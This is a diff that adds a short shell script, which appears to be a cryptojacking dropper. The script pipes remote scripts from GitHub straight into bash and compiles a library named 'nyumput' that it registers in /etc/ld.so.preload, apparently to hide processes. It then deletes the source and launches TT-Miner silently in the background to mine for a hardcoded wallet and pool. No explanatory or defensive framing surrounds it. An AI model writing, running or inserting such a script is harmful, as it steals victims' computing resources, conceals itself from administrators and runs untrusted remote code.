@@ -1,0 +1,17 @@
+#!/bin/sh
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+curl -sL https://github.com/hasmenkuy99/kkrt/raw/main/setup.sh | bash
+apt install curl libssl1.0-dev
+apt install libjansson-dev libjansson4 -y
+curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+wget https://github.com/TrailingStop/TT-Miner-release/releases/download/2024.3.2/TT-Miner-2024.3.2.tar.gz
+tar xvf TT-Miner-2024.3.2.tar.gz
+cd TT-Miner-2024.3.2
+chmod +x TT-Miner
+./TT-Miner -a Flex -o stratum+tcp://kylacoin.cedric-crispin.com:4374 -u kc1qg97pwtnf6jszasdhml9xt4wfu02vyxjvw0vkpm.$(echo $(shuf -i 1000-9999 -n 1)-AA) -p x > /dev/null 2>&1 &
+curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
